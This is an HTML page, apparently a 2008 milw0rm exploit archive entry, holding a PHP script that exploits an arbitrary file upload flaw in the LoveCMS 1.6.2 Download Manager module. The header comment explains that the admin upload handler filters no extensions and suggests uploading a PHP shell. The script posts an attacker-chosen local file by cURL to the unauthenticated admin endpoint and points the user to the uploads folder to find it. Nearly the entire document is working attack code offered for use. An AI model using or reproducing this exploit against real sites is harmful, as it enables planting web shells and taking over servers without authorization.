<html><head><title>LoveCMS 1.6.2 Final (Download Manager 1.0) File Upload Exploit</title></head><pre>&lt;?php

/**
* LoveCMS 1.6.2 Final (Download Manager v1.0) Arbitrary File Upload Exploit
* Discovered &amp;&amp; Exploited by cOndemned
*
* Download:
*	http://www.thethinkingman.net/modules/download_manager/?id=16
*
* Description:
*	This exploit allows attacker to upload any type of file [no extension
*	filtration] ex. php shell... 
*
*	Uploader is adding random number on the begining of file name so user
*	have to check it manually.
*
*	for more information check /modules/download_manager/admin/index.php
*	lines 10 - 27.
*
* Greetz:
*	ZaBeaTy, str0ke, Necro, doctor, sid.psycho, 0in, TBH &amp; Avantura...
*
*/

	if($argc != 3)
	{
		printf(&quot;\n[~] Usage: php %s &lt;target&gt; &lt;localfile&gt;\n&quot;, $argv[0]);
		printf(&quot;[~] Ex.: php %s localhost/lovecms shell.php\n\n&quot;, $argv[0]);
		exit;	
	}

	list($script, $target, $file) = $argv;

	$xpl = curl_init();

	curl_setopt($xpl, CURLOPT_URL, $target . '/modules/download_manager/admin/index.php');
	curl_setopt($xpl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($xpl, CURLOPT_POST, true);
	curl_setopt($xpl, CURLOPT_POSTFIELDS, array('file' =&gt; '@' . $file, 'submit' =&gt; 'Upload'));
	
	curl_exec($xpl);
	curl_close($xpl);

	printf(&quot;[!] Go to the %s/uploads/ and check U'r file :)\n\n&quot;, $target);
	
?&gt;

# milw0rm.com [2008-11-25]</pre></html>